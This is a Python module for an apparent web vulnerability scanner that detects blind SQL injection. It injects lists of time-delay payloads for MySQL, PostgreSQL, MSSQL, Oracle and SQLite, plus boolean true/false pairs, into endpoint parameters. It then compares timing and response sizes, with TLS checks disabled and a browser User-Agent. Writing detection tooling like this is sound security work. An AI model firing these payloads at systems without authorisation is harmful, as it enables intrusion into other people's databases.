"""
sqli_blind.py — Blind SQLi detection via time-delay and boolean-diff probes.

No auth required. Takes a list of endpoints (URL + params) and probes each
parameter with time-delay and boolean-diff payloads. Uses baseline-diff
pattern: measures response time before and after injection, flags outliers.

Supported databases and their time-delay payloads:
  MySQL/MariaDB:  SLEEP(5), BENCHMARK(5000000,MD5('a'))
  PostgreSQL:     pg_sleep(5)
  MSSQL:          WAITFOR DELAY '0:0:5'
  Oracle:         DBMS_LOCK.SLEEP(5)
  SQLite:         randomblob(100000000)
  Generic:        AND SLEEP(5), ' AND SLEEP(5) AND '

Boolean-diff probes:
  AND 1=1 vs AND 1=2 (different response sizes)
  OR 1=1 vs OR 1=2 (different response sizes)
  ' AND '1'='1 vs ' AND '1'='2 (string context)

Config keys (under `sqli_blind.*`):
  time_threshold: seconds above baseline to flag (default 3.0)
  size_diff_threshold: byte difference to flag boolean (default 100)
  max_urls: max endpoints to probe (default 50)
  timeout: per-request timeout (default 15)
  concurrency: async concurrency (default 10)
"""

import asyncio
import json
import time as _time
import re
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

import aiohttp

from app.utils.logger import get_logger

logger = get_logger()

_TIME_PAYLOADS = [
    ("MySQL", "SLEEP(5)", "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z"),
    ("MySQL", "BENCHMARK", "0'XOR(BENCHMARK(5000000,MD5(0x41)))XOR'Z"),
    ("MySQL", "SLEEP(5)", "1' AND SLEEP(5) AND '1'='1"),
    ("MySQL", "SLEEP(5)", "1' AND SLEEP(5)-- -"),
    ("PostgreSQL", "pg_sleep(5)", "1';SELECT pg_sleep(5)--"),
    ("PostgreSQL", "pg_sleep(5)", "1'||pg_sleep(5)||'"),
    ("MSSQL", "WAITFOR", "1';WAITFOR DELAY '0:0:5'--"),
    ("MSSQL", "WAITFOR", "1' WAITFOR DELAY '0:0:5'--"),
    ("Oracle", "DBMS_LOCK", "1' AND DBMS_LOCK.SLEEP(5)=0--"),
    ("SQLite", "randomblob", "1' AND randomblob(100000000) IS NOT NULL--"),
    ("Generic", "SLEEP(5)", "') OR SLEEP(5) AND ('1'='1"),
    ("Generic", "SLEEP(5)", "\") OR SLEEP(5) AND (\"1\"=\"1"),
    ("Generic", "pg_sleep(5)", "') OR pg_sleep(5) AND ('1'='1"),
    ("Generic", "SLEEP(5)", "' OR SLEEP(5) OR '"),
    ("Generic", "pg_sleep(5)", "';SELECT pg_sleep(5);SELECT '"),
    ("Generic", "WAITFOR", "1' WAITFOR DELAY '0:0:5' AND '1'='1"),
    ("Generic", "SLEEP(5)", "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--"),
    ("MySQL", "SLEEP(5)", "1' AND (SELECT SLEEP(5))--"),
    ("PostgreSQL", "pg_sleep(5)", "1' AND (SELECT pg_sleep(5))--"),
    ("MSSQL", "WAITFOR", "1' AND (SELECT * FROM (SELECT WAITFOR DELAY '0:0:5')A)--"),
]

_BOOL_PAYLOADS = [
    ("AND 1=1", "AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND '1'='1'--", "' AND '1'='2'--"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ('") AND ("1"="1', '") AND ("1"="2'),
    (" OR 1=1--", " OR 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ('" OR "1"="1"--', '" OR "1"="2"--'),
    ("' OR 1=1 OR '", "' OR 1=2 OR '"),
    ('" OR 1=1 OR "', '" OR 1=2 OR "'),
    (") OR 1=1--", ") OR 1=2--"),
    ("' OR 1=1--", "' OR 1=2--"),
    ('" OR 1=1--', '" OR 1=2--'),
    ("' OR '1'='1", "' OR '1'='2"),
    ("OR 1=1", "OR 1=2"),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Inject a payload into a URL parameter."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _replace_value_in_body(body: str, param: str, payload: str) -> str:
    """Replace a parameter value in a JSON/URL-encoded body."""
    try:
        data = json.loads(body) if isinstance(body, str) else body
        if isinstance(data, dict):
            data[param] = payload
            return json.dumps(data)
    except Exception:
        pass
    if '=' in body:
        return re.sub(
            rf'({re.escape(param)})=[^&\s]*',
            rf'\1={payload}',
            body
        )
    return body


class BlindSQLiScanner:
    """No-auth blind SQLi detection via time-delay and boolean-diff."""

    def __init__(self, config: Optional[Dict] = None):
        config = config or {}
        cfg = config.get('sqli_blind', {}) if isinstance(config, dict) else {}
        self.time_threshold = float(cfg.get('time_threshold', 3.0))
        self.size_diff_threshold = int(cfg.get('size_diff_threshold', 100))
        self.max_urls = int(cfg.get('max_urls', 50))
        self.timeout = int(cfg.get('timeout', 15))
        self.concurrency = int(cfg.get('concurrency', 10))
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        }

    async def _baseline(self, session: aiohttp.ClientSession,
                        url: str, method: str = 'GET',
                        body: Optional[str] = None) -> Tuple[float, int, str]:
        """Measure baseline response time and size."""
        t0 = _time.monotonic()
        try:
            if method.upper() == 'POST':
                async with session.post(url, data=body, headers=self.headers,
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    text = await r.text(errors='ignore')
                    return _time.monotonic() - t0, len(text), text
            else:
                async with session.get(url, headers=self.headers,
                                       timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    text = await r.text(errors='ignore')
                    return _time.monotonic() - t0, len(text), text
        except Exception:
            return _time.monotonic() - t0, -1, ''

    async def _probe_time(self, session: aiohttp.ClientSession,
                          url: str, param: str, payload: str,
                          method: str = 'GET',
                          body: Optional[str] = None) -> Tuple[float, int, str]:
        """Probe with a time-delay payload."""
        probe_url = _inject_param(url, param, payload)
        probe_body = _replace_value_in_body(body or '', param, payload) if body else None
        return await self._baseline(session, probe_url, method, probe_body)

    async def _probe_time_endpoint(self, session: aiohttp.ClientSession,
                                   semaphore: asyncio.Semaphore,
                                   url: str, params: List[str],
                                   method: str = 'GET',
                                   body: Optional[str] = None) -> List[Dict]:
        async with semaphore:
            baseline_time, baseline_size, _ = await self._baseline(session, url, method, body)
            if baseline_size < 0:
                return []

            findings = []
            for param in params:
                for db, technique, payload in _TIME_PAYLOADS:
                    try:
                        probe_time, _, _ = await self._probe_time(
                            session, url, param, payload, method, body)
                        delay = probe_time - baseline_time
                        if delay >= self.time_threshold:
                            findings.append({
                                'type': 'blind_sqli_time',
                                'severity': 'HIGH',
                                'param': param,
                                'database': db,
                                'technique': technique,
                                'payload': payload[:80],
                                'baseline_ms': round(baseline_time * 1000),
                                'probe_ms': round(probe_time * 1000),
                                'delay_s': round(delay, 2),
                                'endpoint': url,
                                'confidence': 'medium' if delay >= 5.0 else 'low',
                            })
                            break
                    except Exception:
                        continue
            return findings

    async def _probe_bool_endpoint(self, session: aiohttp.ClientSession,
                                   semaphore: asyncio.Semaphore,
                                   url: str, params: List[str],
                                   method: str = 'GET',
                                   body: Optional[str] = None) -> List[Dict]:
        async with semaphore:
            findings = []
            for param in params:
                for true_payload, false_payload in _BOOL_PAYLOADS:
                    try:
                        true_url = _inject_param(url, param, true_payload)
                        false_url = _inject_param(url, param, false_payload)
                        _, true_size, _ = await self._baseline(session, true_url, method)
                        _, false_size, _ = await self._baseline(session, false_url, method)
                        if true_size < 0 or false_size < 0:
                            break
                        diff = abs(true_size - false_size)
                        if diff >= self.size_diff_threshold:
                            findings.append({
                                'type': 'blind_sqli_boolean',
                                'severity': 'HIGH',
                                'param': param,
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'true_size': true_size,
                                'false_size': false_size,
                                'size_diff': diff,
                                'endpoint': url,
                                'confidence': 'medium' if diff >= 500 else 'low',
                            })
                            break
                    except Exception:
                        continue
            return findings

    async def scan(self, endpoints: List[Dict]) -> Dict[str, Any]:
        """Scan a list of endpoints for blind SQLi.

        Each endpoint: {'url': '...', 'method': 'GET', 'params': ['id','q']}
        """
        if not endpoints:
            return {'time_findings': [], 'bool_findings': [], 'total_probed': 0}

        endpoints = endpoints[:self.max_urls]
        semaphore = asyncio.Semaphore(self.concurrency)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            time_tasks = []
            bool_tasks = []
            for ep in endpoints:
                url = ep.get('url', '') or ep.get('endpoint', '')
                if not url or not url.startswith(('http://', 'https://')):
                    continue
                params = ep.get('params', [])
                if not params or not isinstance(params, list):
                    parsed = parse_qs(urlparse(url).query)
                    params = list(parsed.keys())
                if not params:
                    continue
                method = ep.get('method', 'GET')
                body = ep.get('body')
                time_tasks.append(self._probe_time_endpoint(
                    session, semaphore, url, params, method, body))
                bool_tasks.append(self._probe_bool_endpoint(
                    session, semaphore, url, params, method, body))

            time_results = await asyncio.gather(*time_tasks, return_exceptions=True)
            bool_results = await asyncio.gather(*bool_tasks, return_exceptions=True)

        time_findings = []
        for r in time_results:
            if isinstance(r, list):
                time_findings.extend(r)

        bool_findings = []
        for r in bool_results:
            if isinstance(r, list):
                bool_findings.extend(r)

        return {
            'time_findings': time_findings,
            'bool_findings': bool_findings,
            'total_probed': len(endpoints),
        }

    def scan_sync(self, endpoints: List[Dict]) -> Dict[str, Any]:
        try:
            return asyncio.run(self.scan(endpoints))
        except RuntimeError:
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                return ex.submit(asyncio.run, self.scan(endpoints)).result()
        except Exception as e:
            logger.error(f"Blind SQLi scan failed: {e}")
            return {'time_findings': [], 'bool_findings': [], 'total_probed': 0}


__all__ = ['BlindSQLiScanner']
